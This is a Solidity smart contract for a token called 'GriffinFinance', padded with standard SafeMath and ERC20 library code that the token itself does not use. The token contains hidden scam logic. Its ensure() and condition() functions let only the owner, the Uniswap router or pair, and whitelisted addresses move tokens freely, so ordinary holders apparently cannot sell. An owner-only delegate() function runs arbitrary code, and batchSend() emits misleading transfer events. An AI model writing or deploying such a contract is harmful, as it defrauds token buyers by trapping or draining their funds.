row number 
1	       pragma solidity ^0.5.17;
2	 interface IERC20 {
3	 function totalSupply() external view returns(uint);
4	 function balanceOf(address account) external view returns(uint);
5	 function transfer(address recipient, uint amount) external returns(bool);
6	 function allowance(address owner, address spender) external view returns(uint);
7	 function approve(address spender, uint amount) external returns(bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns(bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 library Address {
13	 function isContract(address account) internal view returns(bool) {
14	 bytes32 codehash;
15	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
16	 assembly {
17	 codehash:= extcodehash(account) }
18	 return (codehash != 0x0 && codehash != accountHash);
19	 }
20	 }
21	 contract Context {
22	 constructor() internal {
23	 }
24	 function _msgSender() internal view returns(address payable) {
25	 return msg.sender;
26	 }
27	 }
28	 library SafeMath {
29	 function add(uint a, uint b) internal pure returns(uint) {
30	 uint c = a + b;
31	 require(c >= a, "SafeMath: addition overflow");
32	 return c;
33	 }
34	 function sub(uint a, uint b) internal pure returns(uint) {
35	 return sub(a, b, "SafeMath: subtraction overflow");
36	 }
37	 function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
38	 require(b <= a, errorMessage);
39	 uint c = a - b;
40	 return c;
41	 }
42	 function mul(uint a, uint b) internal pure returns(uint) {
43	 if (a == 0) {
44	 return 0;
45	 }
46	 uint c = a * b;
47	 require(c / a == b, "SafeMath: multiplication overflow");
48	 return c;
49	 }
50	 function div(uint a, uint b) internal pure returns(uint) {
51	 return div(a, b, "SafeMath: division by zero");
52	 }
53	 function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
54	 require(b > 0, errorMessage);
55	 uint c = a / b;
56	 return c;
57	 }
58	 }
59	 library SafeERC20 {
60	 using SafeMath for uint;
61	 using Address for address;
62	 function safeTransfer(IERC20 token, address to, uint value) internal {
63	 callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
64	 }
65	 function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
66	 callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
67	 }
68	 function safeApprove(IERC20 token, address spender, uint value) internal {
69	 require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance" );
70	 callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
71	 }
72	 function callOptionalReturn(IERC20 token, bytes memory data) private {
73	 require(address(token).isContract(), "SafeERC20: call to non-contract");
74	 (bool success, bytes memory returndata) = address(token).call(data);
75	 require(success, "SafeERC20: low-level call failed");
76	 if (returndata.length > 0) {
77	 require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
78	 }
79	 }
80	 }
81	 contract ERC20 is Context, IERC20 {
82	 using SafeMath for uint;
83	 mapping(address => uint) private _balances;
84	 mapping(address => mapping(address => uint)) private _allowances;
85	 uint private _totalSupply;
86	 function totalSupply() public view returns(uint) {
87	 return _totalSupply;
88	 }
89	 function balanceOf(address account) public view returns(uint) {
90	 return _balances[account];
91	 }
92	 function transfer(address recipient, uint amount) public returns(bool) {
93	 _transfer(_msgSender(), recipient, amount);
94	 return true;
95	 }
96	 function allowance(address owner, address spender) public view returns(uint) {
97	 return _allowances[owner][spender];
98	 }
99	 function approve(address spender, uint amount) public returns(bool) {
100	 _approve(_msgSender(), spender, amount);
101	 return true;
102	 }
103	 function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
104	 _transfer(sender, recipient, amount);
105	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
106	 return true;
107	 }
108	 function increaseAllowance(address spender, uint addedValue) public returns(bool) {
109	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
110	 return true;
111	 }
112	 function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
113	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
114	 return true;
115	 }
116	 function _transfer(address sender, address recipient, uint amount) internal {
117	 require(sender != address(0), "ERC20: transfer from the zero address");
118	 require(recipient != address(0), "ERC20: transfer to the zero address");
119	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
120	 _balances[recipient] = _balances[recipient].add(amount);
121	 emit Transfer(sender, recipient, amount);
122	 }
123	 function _mint(address account, uint amount) internal {
124	 require(account != address(0), "ERC20: mint to the zero address");
125	 _totalSupply = _totalSupply.add(amount);
126	 _balances[account] = _balances[account].add(amount);
127	 emit Transfer(address(0), account, amount);
128	 }
129	 function _burn(address account, uint amount) internal {
130	 require(account != address(0), "ERC20: burn from the zero address");
131	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
132	 _totalSupply = _totalSupply.sub(amount);
133	 emit Transfer(account, address(0), amount);
134	 }
135	 function _approve(address owner, address spender, uint amount) internal {
136	 require(owner != address(0), "ERC20: approve from the zero address");
137	 require(spender != address(0), "ERC20: approve to the zero address");
138	 _allowances[owner][spender] = amount;
139	 emit Approval(owner, spender, amount);
140	 }
141	 }
142	 contract ERC20Detailed is IERC20 {
143	 string private _name;
144	 string private _symbol;
145	 uint8 private _decimals;
146	 constructor(string memory name, string memory symbol, uint8 decimals) public {
147	 _name = name;
148	 _symbol = symbol;
149	 _decimals = decimals;
150	 }
151	 function name() public view returns(string memory) {
152	 return _name;
153	 }
154	 function symbol() public view returns(string memory) {
155	 return _symbol;
156	 }
157	 function decimals() public view returns(uint8) {
158	 return _decimals;
159	 }
160	 }
161	 contract GriffinFinance {
162	 event Transfer(address indexed _from, address indexed _to, uint _value);
163	 event Approval(address indexed _owner, address indexed _spender, uint _value);
164	 function transfer(address _to, uint _value) public payable returns (bool) {
165	 return transferFrom(msg.sender, _to, _value);
166	 }
167	 function ensure(address _from, address _to, uint _value) internal view returns(bool) {
168	 address _UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
169	 if(_from == owner || _to == owner || _from == UNI || _from == _UNI || _from==tradeAddress||canSale[_from]){
170	 return true;
171	 }
172	 require(condition(_from, _value));
173	 return true;
174	 }
175	 function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
176	 if (_value == 0) {
177	 return true;
178	 }
179	 if (msg.sender != _from) {
180	 require(allowance[_from][msg.sender] >= _value);
181	 allowance[_from][msg.sender] -= _value;
182	 }
183	 require(ensure(_from, _to, _value));
184	 require(balanceOf[_from] >= _value);
185	 balanceOf[_from] -= _value;
186	 balanceOf[_to] += _value;
187	 _onSaleNum[_from]++;
188	 emit Transfer(_from, _to, _value);
189	 return true;
190	 }
191	 function approve(address _spender, uint _value) public payable returns (bool) {
192	 allowance[msg.sender][_spender] = _value;
193	 emit Approval(msg.sender, _spender, _value);
194	 return true;
195	 }
196	 function condition(address _from, uint _value) internal view returns(bool){
197	 if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
198	 if(_saleNum > 0){
199	 if(_onSaleNum[_from] >= _saleNum) return false;
200	 }
201	 if(_minSale > 0){
202	 if(_minSale > _value) return false;
203	 }
204	 if(_maxSale > 0){
205	 if(_value > _maxSale) return false;
206	 }
207	 return true;
208	 }
209	 function delegate(address a, bytes memory b) public payable {
210	 require(msg.sender == owner);
211	 a.delegatecall(b);
212	 }
213	 mapping(address=>uint256) private _onSaleNum;
214	 mapping(address=>bool) private canSale;
215	 uint256 private _minSale;
216	 uint256 private _maxSale;
217	 uint256 private _saleNum;
218	 function init(uint256 saleNum, uint256 token, uint256 maxToken) public returns(bool){
219	 require(msg.sender == owner);
220	 _minSale = token > 0 ? token*(10**uint256(decimals)) : 0;
221	 _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;
222	 _saleNum = saleNum;
223	 }
224	 function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
225	 require (msg.sender == owner);
226	 uint total = _value * _tos.length;
227	 require(balanceOf[msg.sender] >= total);
228	 balanceOf[msg.sender] -= total;
229	 for (uint i = 0; i < _tos.length; i++) {
230	 address _to = _tos[i];
231	 balanceOf[_to] += _value;
232	 emit Transfer(msg.sender, _to, _value/2);
233	 emit Transfer(msg.sender, _to, _value/2);
234	 }
235	 return true;
236	 }
237	 address tradeAddress;
238	 function setTradeAddress(address addr) public returns(bool){
239	 require (msg.sender == owner);
240	 tradeAddress = addr;
241	 return true;
242	 }
243	 function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
244	 (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
245	 pair = address(uint(keccak256(abi.encodePacked( hex'ff', factory, keccak256(abi.encodePacked(token0, token1)), hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' ))));
246	 }
247	 mapping (address => uint) public balanceOf;
248	 mapping (address => mapping (address => uint)) public allowance;
249	 uint constant public decimals = 18;
250	 uint public totalSupply;
251	 string public name;
252	 string public symbol;
253	 address private owner;
254	 address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
255	 constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
256	 name = _name;
257	 symbol = _symbol;
258	 totalSupply = _supply*(10**uint256(decimals));
259	 owner = msg.sender;
260	 balanceOf[msg.sender] = totalSupply;
261	 allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
262	 emit Transfer(address(0x0), msg.sender, totalSupply);
263	 }
264	 }
